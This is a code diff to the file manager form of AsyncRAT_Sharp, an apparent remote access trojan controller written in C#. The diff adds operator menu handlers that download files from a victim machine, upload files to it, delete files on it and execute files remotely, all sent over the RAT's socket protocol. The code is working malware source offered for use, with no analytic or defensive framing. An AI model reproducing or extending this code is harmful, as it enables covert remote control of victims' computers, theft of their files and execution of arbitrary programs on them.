@@ -1,15 +1,9 @@
 ﻿using AsyncRAT_Sharp.MessagePack;
 using AsyncRAT_Sharp.Sockets;
 using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Diagnostics;
+using System.Threading;
+using System.IO;
 
 namespace AsyncRAT_Sharp.Forms
 {
@@ -25,14 +19,21 @@ namespace AsyncRAT_Sharp.Forms
 
         private void listView1_DoubleClick(object sender, EventArgs e)
         {
-            if (listView1.SelectedItems.Count == 1)
+            try
             {
-                MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "fileManager";
-                msgpack.ForcePathObject("Command").AsString = "getPath";
-                msgpack.ForcePathObject("Path").AsString = listView1.SelectedItems[0].ToolTipText;
-                C.BeginSend(msgpack.Encode2Bytes());
-                toolStripStatusLabel1.Text = listView1.SelectedItems[0].ToolTipText;
+                if (listView1.SelectedItems.Count == 1)
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                    msgpack.ForcePathObject("Command").AsString = "getPath";
+                    msgpack.ForcePathObject("Path").AsString = listView1.SelectedItems[0].ToolTipText;
+                    C.BeginSend(msgpack.Encode2Bytes());
+                    toolStripStatusLabel1.Text = listView1.SelectedItems[0].ToolTipText;
+                }
+            }
+            catch
+            {
+
             }
         }
 
@@ -65,6 +66,125 @@ namespace AsyncRAT_Sharp.Forms
                 return;
             }
 
+        }
+
+        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    foreach (ListViewItem itm in listView1.SelectedItems)
+                    {
+                        MsgPack msgpack = new MsgPack();
+                        string dwid = Guid.NewGuid().ToString();
+                        msgpack.ForcePathObject("Packet").AsString = "socketDownload";
+                        msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
+                        msgpack.ForcePathObject("DWID").AsString = dwid;
+                        ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+                        this.BeginInvoke((MethodInvoker)(() =>
+                        {
+                            DownloadFile SD = (DownloadFile)Application.OpenForms["socketDownload:" + dwid];
+                            if (SD == null)
+                            {
+                                SD = new DownloadFile
+                                {
+                                    Name = "socketDownload:" + dwid,
+                                    Text = "socketDownload:" + C.ID,
+                                    F = F
+                                };
+                                SD.Show();
+                            }
+                        }));
+                    }
+                }
+            }
+            catch
+            {
+
+            }
+        }
+
+        private async void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                OpenFileDialog O = new OpenFileDialog();
+                if (O.ShowDialog() == DialogResult.OK)
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                    msgpack.ForcePathObject("Command").AsString = "uploadFile";
+                    await msgpack.ForcePathObject("File").LoadFileAsBytes(O.FileName);
+                    msgpack.ForcePathObject("Name").AsString = toolStripStatusLabel1.Text + "\\" + Path.GetFileName(O.FileName);
+                    ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+                }
+            }
+            catch (Exception ex)
+            {
+            }
+        }
+
+        private void dELETEToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    foreach (ListViewItem itm in listView1.SelectedItems)
+                    {
+                        MsgPack msgpack = new MsgPack();
+                        string dwid = Guid.NewGuid().ToString();
+                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                        msgpack.ForcePathObject("Command").AsString = "deleteFile";
+                        msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
+                        ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+                    }
+                }
+            }
+            catch
+            {
+
+            }
+        }
+
+        private void rEFRESHToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                msgpack.ForcePathObject("Command").AsString = "getPath";
+                msgpack.ForcePathObject("Path").AsString = toolStripStatusLabel1.Text;
+                C.BeginSend(msgpack.Encode2Bytes());
+            }
+            catch
+            {
+
+            }
+        }
+
+        private void eXECUTEToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    foreach (ListViewItem itm in listView1.SelectedItems)
+                    {
+                        MsgPack msgpack = new MsgPack();
+                        string dwid = Guid.NewGuid().ToString();
+                        msgpack.ForcePathObject("Packet").AsString = "fileManager";
+                        msgpack.ForcePathObject("Command").AsString = "execute";
+                        msgpack.ForcePathObject("File").AsString = itm.ToolTipText;
+                        ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
+                    }
+                }
+            }
+            catch
+            {
+
+            }
         }
     }
 }
